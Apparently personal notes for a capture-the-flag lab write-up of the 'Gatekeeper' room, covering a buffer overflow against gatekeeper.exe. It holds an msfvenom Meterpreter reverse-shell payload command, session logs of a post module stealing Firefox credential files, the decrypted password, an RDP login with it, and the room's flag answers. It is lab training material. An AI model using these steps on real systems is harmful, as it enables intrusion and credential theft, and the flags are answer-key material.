# Gate Keeper

## Task 1  Approach the Gates
+ `No Answer Needed`

## Task 2  Defeat the Gatekeeper and pass through the fire.
+ Locate and find the User Flag. `{H4lf_W4y_Th3r3}`
+ Locate and find the Root Flag `{Th3_M4y0r_C0ngr4tul4t3s_U}`

## Enumeration on Samba and got the `gatekeeper.exe`
+ offset = 146
+ jump_esp
    - `080414C3`
    - `080416BF`
+ badchar `\x00\x0a`
+ generate payload `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.37.160  LPORT=1337  EXITFUNC=thread -f c -b "\x00\x0a"`

## privilege escalation
+ on meterpreter
```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.4.37.160:1337
[*] Sending stage (175686 bytes) to 10.10.143.166
[*] Meterpreter session 2 opened (10.4.37.160:1337 -> 10.10.143.166:49174) at 2024-02-05 20:26:14 +0700

meterpreter > sysinfo
Computer        : GATEKEEPER
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows


meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  2         meterpreter x86/windows  GATEKEEPER\natbat @ GATEKEEPER  10.4.37.160:1337 -> 10.10.143.166:49174 (10.10.143.166)

msf6 exploit(multi/handler) > use post/multi/gather/firefox_creds
msf6 post(multi/gather/firefox_creds) > run

[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?
[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
[+] Downloaded cert9.db: /home/lodwig/.msf4/loot/20240205203931_default_10.10.143.166_ff.ljfn812a.cert_199930.bin
[+] Downloaded cookies.sqlite: /home/lodwig/.msf4/loot/20240205203934_default_10.10.143.166_ff.ljfn812a.cook_973955.bin
[+] Downloaded key4.db: /home/lodwig/.msf4/loot/20240205203939_default_10.10.143.166_ff.ljfn812a.key4_122635.bin
[+] Downloaded logins.json: /home/lodwig/.msf4/loot/20240205203943_default_10.10.143.166_ff.ljfn812a.logi_573928.bin

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default

[*] Post module execution completed
```
+ Change the downloaded file 
```bash
┌──(lodwig㉿kali)-[~/.msf4/loot]
└─$ ls
cert9.db  cookies.sqlite  key4.db  login.json

┌──(lodwig㉿kali)-[~/Documents/THM/GateKeeper]
└─$ python ff.py ./
2024-02-05 20:44:34,348 - WARNING - profile.ini not found in ./
2024-02-05 20:44:34,349 - WARNING - Continuing and assuming './' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'

```
+ use free rdp to connect `xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /v:10.10.143.166 /cert:ignore /workarea /tls-seclevel:+enforce-tls1_2`
+ Check the file `root.txt`

